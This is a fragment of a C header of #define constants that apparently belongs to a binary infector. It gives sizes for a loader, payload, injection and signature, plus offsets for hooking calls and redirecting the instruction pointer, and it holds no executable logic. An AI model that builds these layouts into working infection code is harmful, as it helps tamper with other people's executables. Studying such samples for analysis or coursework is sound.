...
# define BIS_SIZE 0x3a6
# define LOADER_SIZE 0xca
# define PAYLOAD_SIZE 0x5699 - FT_MEMCPY_ADDR + 0x7
# define MAIN_OFFSET 0x518e - FT_MEMCPY_ADDR
# define INJECT_SIZE LOADER_SIZE + SIGN_SIZE + 8

# define OFFSET_1 0x4125 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_2 0x402d + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_3 0x4167 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_4 0x5199 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_5 0x17ec + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_6 0x4e39 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_7 0x4398 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_8 0x51ef + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_RIP 0x4e48 - FT_MEMCPY_ADDR

# define OFFSET_HOOK_1 0x4e63 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_1 0x4e59 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_2 0x4e90 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_2 0x4e86 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_3 0x4ebd + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_3 0x4eb3 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_4 0x4eea + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_4 0x4ee0 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_5 0x4f17 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_5 0x4f0d + BIS_SIZE - FT_MEMCPY_ADDR
